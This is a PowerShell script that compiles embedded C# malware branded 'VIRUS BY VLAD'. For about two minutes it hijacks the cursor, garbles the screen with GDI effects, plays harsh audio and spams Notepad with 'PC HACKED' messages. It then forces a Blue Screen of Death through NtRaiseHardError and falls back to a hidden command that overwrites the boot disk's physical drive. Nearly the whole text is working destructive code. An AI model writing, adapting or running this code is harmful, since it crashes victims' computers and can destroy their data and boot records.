Set-ExecutionPolicy Bypass -Scope Process -Force

$randId = Get-Random -Minimum 10000 -Maximum 99999
$namespaceName = "UltimateVladChaos_$randId"

$code = @"
using System;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Windows.Forms;

namespace $namespaceName {
    public class PayloadRunner {
        [DllImport("user32.dll")] public static extern IntPtr GetDC(IntPtr hwnd);
        [DllImport("user32.dll")] public static extern int ReleaseDC(IntPtr hwnd, IntPtr hdc);
        [DllImport("gdi32.dll")] public static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);
        [DllImport("gdi32.dll")] public static extern bool StretchBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight, IntPtr hdcSrc, int nXSrc, int nYSrc, int nWidthSrc, int nHeightSrc, uint dwRop);
        [DllImport("user32.dll")] public static extern int GetSystemMetrics(int nIndex);
        [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vKey);
        [DllImport("user32.dll")] public static extern bool SetCursorPos(int X, int Y);
        [DllImport("user32.dll")] public static extern IntPtr LoadIcon(IntPtr hInstance, int lpIconName);
        [DllImport("user32.dll")] public static extern bool DrawIcon(IntPtr hdc, int x, int y, IntPtr hIcon);
        [DllImport("user32.dll")] public static extern bool InvalidateRect(IntPtr hWnd, IntPtr lpRect, bool bErase);
        [DllImport("gdi32.dll")] public static extern IntPtr CreateSolidBrush(uint crColor);
        [DllImport("gdi32.dll")] public static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);
        [DllImport("gdi32.dll")] public static extern bool DeleteObject(IntPtr hObject);
        [DllImport("gdi32.dll")] public static extern bool PatBlt(IntPtr hdc, int nXLeft, int nYLeft, int nWidth, int nHeight, uint dwRop);
        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint RtlAdjustPrivilege(int privilege, bool enable, bool currentThread, out bool enabled);
        [DllImport("ntdll.dll", SetLastError = true)] public static extern uint NtRaiseHardError(uint errorStatus, uint numberOfParameters, uint unicodeStringParameterMask, IntPtr parameters, uint validResponseOption, out uint response);

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEFORMATEX {
            public ushort wFormatTag; public ushort nChannels; public uint nSamplesPerSec;
            public uint nAvgBytesPerSec; public ushort nBlockAlign; public ushort wBitsPerSample; public ushort cbSize;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct WAVEHDR {
            public IntPtr lpData; public uint dwBufferLength; public uint dwBytesRecorded;
            public IntPtr dwUser; public uint dwFlags; public uint dwLoops; public IntPtr lpNext; public IntPtr reserved;
        }

        [DllImport("winmm.dll")] public static extern int waveOutOpen(out IntPtr hWaveOut, uint uDeviceID, ref WAVEFORMATEX lpFormat, IntPtr dwCallback, IntPtr dwInstance, uint fdwOpen);
        [DllImport("winmm.dll")] public static extern int waveOutPrepareHeader(IntPtr hWaveOut, ref WAVEHDR lpWaveOutHdr, uint uSize);
        [DllImport("winmm.dll")] public static extern int waveOutWrite(IntPtr hWaveOut, ref WAVEHDR lpWaveOutHdr, uint uSize);

        const uint SRCINVERT = 0x00660046;
        const uint SRCCOPY   = 0x00CC0220;
        const uint SRCPAINT  = 0x00EE0086;
        const uint PATINVERT = 0x005A0049;
        const uint DSTINVERT = 0x00550009;
        const uint NOTSRCOPY = 0x00330008;
        const uint SRCAND    = 0x008800C6;

        public static int currentPayload = 1;
        public static bool isRunning = true;

        public static void AudioThread() {
            IntPtr hWaveOut;
            WAVEFORMATEX wfx = new WAVEFORMATEX();
            wfx.wFormatTag = 1; wfx.nChannels = 1; wfx.nSamplesPerSec = 8000;
            wfx.nAvgBytesPerSec = 8000; wfx.nBlockAlign = 1; wfx.wBitsPerSample = 8; wfx.cbSize = 0;

            if (waveOutOpen(out hWaveOut, 0xFFFFFFFF, ref wfx, IntPtr.Zero, IntPtr.Zero, 0) != 0) return;

            int bufferSize = 8000;
            byte[] buffer = new byte[bufferSize];
            GCHandle handle = GCHandle.Alloc(buffer, GCHandleType.Pinned);

            WAVEHDR header = new WAVEHDR();
            header.lpData = handle.AddrOfPinnedObject();
            header.dwBufferLength = (uint)bufferSize;

            int t = 0;
            while (isRunning) {
                for (int i = 0; i < bufferSize; i++) {
                    byte b = 0;
                    // 7 completely different bytebeat formulas
                    switch (currentPayload) {
                        case 1: b = (byte)((t * 5 & t >> 7) | (t * 3 & t >> 10)); break;
                        case 2: b = (byte)((t >> 3) * (t >> 4) ^ (t >> 6)); break;
                        case 3: b = (byte)((t * (t >> 8 | t >> 9) & 46) * t); break;
                        case 4: b = (byte)((t * ((t >> 9 | t >> 13) % 11)) ^ (t >> 2)); break;
                        case 5: b = (byte)((t * (t >> 5 | t >> 8)) ^ (t >> 16)); break;
                        case 6: b = (byte)(((t * (t >> 8)) ^ (t * (t >> 13))) & 255); break;
                        case 7: b = (byte)((t * 3 & t >> 3 | t * 5 & t >> 4 | t * 7 & t >> 5)); break;
                    }
                    buffer[i] = b;
                    t++;
                }
                waveOutPrepareHeader(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
                waveOutWrite(hWaveOut, ref header, (uint)Marshal.SizeOf(header));
                Thread.Sleep(950);
            }
        }

        public static void Run() {
            int w = GetSystemMetrics(0);
            int h = GetSystemMetrics(1);
            Random r = new Random();

            Thread aThread = new Thread(AudioThread);
            aThread.IsBackground = true;
            aThread.Start();

            DateTime start = DateTime.Now;
            int appTimer = 0;

            Bitmap memeLogo = new Bitmap(140, 140);
            using (Graphics g = Graphics.FromImage(memeLogo)) {
                g.Clear(Color.FromArgb(50, 170, 240));
                using (Brush bWhite = new SolidBrush(Color.White), bBlack = new SolidBrush(Color.Black)) {
                    g.FillEllipse(bWhite, 20, 20, 100, 100);
                    g.FillRectangle(bBlack, 45, 55, 18, 8);
                    g.FillRectangle(bBlack, 75, 55, 18, 8);
                    using (Pen pBlack = new Pen(Color.Black, 4)) {
                        g.DrawArc(pBlack, 45, 75, 45, 25, 0, 180);
                    }
                }
            }

            while (isRunning) {
                if ((GetAsyncKeyState(0x1B) & 0x8000) != 0) break;

                IntPtr hdc = GetDC(IntPtr.Zero);
                int elapsed = (int)(DateTime.Now - start).TotalSeconds;

                // 7 stages of 20 seconds each (total 140 seconds)
                if (elapsed >= 140) {
                    isRunning = false;
                    break;
                }

                currentPayload = (elapsed / 20) + 1;

                // Frantic cursor movement
                SetCursorPos(r.Next(0, w), r.Next(0, h));

                // Opening applications and typing text from Vlad
                appTimer++;
                if (appTimer % 100 == 0) {
                    try {
                        Process.Start("notepad.exe");
                        Thread.Sleep(200);
                        SendKeys.SendWait("ERROR ERROR 277 67 67, VIRUS BY VLAD{ENTER}");
                        SendKeys.SendWait("LOL LOL LOL LOL PC HACKED LOLOLOLOL{ENTER}");
                    } catch {}
                }
                if (appTimer % 250 == 0) {
                    try {
                        foreach (var proc in Process.GetProcessesByName("notepad")) { proc.Kill(); }
                    } catch {}
                }

                // Moving the image like a cube
                using (Graphics gScreen = Graphics.FromHdc(hdc)) {
                    int cubeX = (int)(Math.Cos(elapsed * 4) * 300 + (w / 2) - 70);
                    int cubeY = (int)(Math.Sin(elapsed * 6) * 200 + (h / 2) - 70);
                    gScreen.DrawImage(memeLogo, cubeX, cubeY);
                }

                // 7 completely different GDI effects
                switch (currentPayload) {
                    case 1:
                        // Effect 1: Screen inversion with jitter
                        BitBlt(hdc, r.Next(-25, 26), r.Next(-25, 26), w, h, hdc, 0, 0, SRCINVERT);
                        break;
                    case 2:
                        // Effect 2: Chaotic screen blocks
                        for (int i = 0; i < 25; i++) {
                            int bx = r.Next(0, w - 150);
                            int by = r.Next(0, h - 150);
                            BitBlt(hdc, bx + r.Next(-15, 16), by + r.Next(-15, 16), 150, 150, hdc, bx, by, SRCCOPY);
                        }
                        break;
                    case 3:
                        // Effect 3: Sine wave paint strips
                        for (int y = 0; y < h; y += 20) {
                            int shift = (int)(Math.Sin(y * 0.05 + elapsed * 10) * 50);
                            BitBlt(hdc, shift, y, w, 20, hdc, 0, y, SRCPAINT);
                        }
                        break;
                    case 4:
                        // Effect 4: Stretch and Pattern Invert
                        PatBlt(hdc, 0, 0, w, h, PATINVERT);
                        StretchBlt(hdc, 20, 20, w - 40, h - 40, hdc, 0, 0, w, h, SRCCOPY);
                        break;
                    case 5:
                        // Effect 5: Vertical strips NotSrCopy
                        for (int x = 0; x < w; x += 30) {
                            BitBlt(hdc, x, r.Next(-30, 31), 30, h, hdc, x, 0, NOTSRCOPY);
                        }
                        break;
                    case 6:
                        // Effect 6: Icon spam and zoom with SRCAND blend
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32513));
                        DrawIcon(hdc, r.Next(0, w), r.Next(0, h), LoadIcon(IntPtr.Zero, 32516));
                        StretchBlt(hdc, -20, -20, w + 40, h + 40, hdc, 0, 0, w, h, SRCAND);
                        break;
                    case 7:
                        // Effect 7: Total color destruction with DSTINVERT
                        BitBlt(hdc, 0, 0, w, h, hdc, 0, 0, NOTSRCOPY);
                        if (r.Next(0, 2) == 0) PatBlt(hdc, 0, 0, w, h, DSTINVERT);
                        break;
                }

                ReleaseDC(IntPtr.Zero, hdc);
                Thread.Sleep(10);
            }

            InvalidateRect(IntPtr.Zero, IntPtr.Zero, true);

            // FINALE: Display final text on screen over everything
            IntPtr finalHdc = GetDC(IntPtr.Zero);
            using (Graphics gFinal = Graphics.FromHdc(finalHdc)) {
                gFinal.Clear(Color.Black);
                using (Font font = new Font("Consolas", 32, FontStyle.Bold))
                using (Brush brush = new SolidBrush(Color.Red)) {
                    gFinal.DrawString("ERROR ERROR 277 67 67, VIRUS BY VLAD\nLOL LOL LOL LOL PC HACKED LOLOLOLOL", font, brush, 100, h / 2 - 100);
                }
            }
            ReleaseDC(IntPtr.Zero, finalHdc);
            Thread.Sleep(4000);

            // AFTERMATH: Blue Screen of Death (BSOD) via NT system call
            try {
                bool privilegeEnabled;
                uint response;
                RtlAdjustPrivilege(19, true, false, out privilegeEnabled);
                NtRaiseHardError(0xC0000022, 0, 0, IntPtr.Zero, 6, out response);
            } catch {
                // Fallback: forcefully overwrite MBR if administrative privileges are available
                try {
                    Process.Start(new ProcessStartInfo("cmd.exe", "/c echo null > \\\\.\\PhysicalDrive0") { WindowStyle = ProcessWindowStyle.Hidden }).WaitForExit();
                } catch {}
            }
        }
    }
}
"@

$compiled = Add-Type -TypeDefinition $code -Language CSharp -ReferencedAssemblies "System.Windows.Forms", "System.Drawing" -PassThru
$runner = $compiled | Where-Object { $_.Name -eq "PayloadRunner" }
$runner::Run()